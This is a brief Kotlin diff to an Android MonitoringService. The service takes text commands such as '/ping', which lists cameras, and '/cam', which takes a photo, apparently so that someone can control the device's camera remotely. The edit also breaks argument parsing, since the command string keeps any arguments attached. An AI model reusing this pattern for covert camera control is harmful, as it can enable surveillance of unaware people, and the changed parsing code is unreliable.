@@ -222,9 +222,8 @@ class MonitoringService : LifecycleService() {
     }
     }
 private fun handle(raw: String) {
-    val trimmed = raw.trim()
-    val cmd = trimmed.substringBefore(' ', "").lowercase()
-    val arg = trimmed.substringAfter(' ', "").trim()
+    val cmd = raw.lowercase()
+    val arg = raw.substringAfter(' ', "").trim()
     when {
         cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
         cmd == "/cam" -> photo(true)
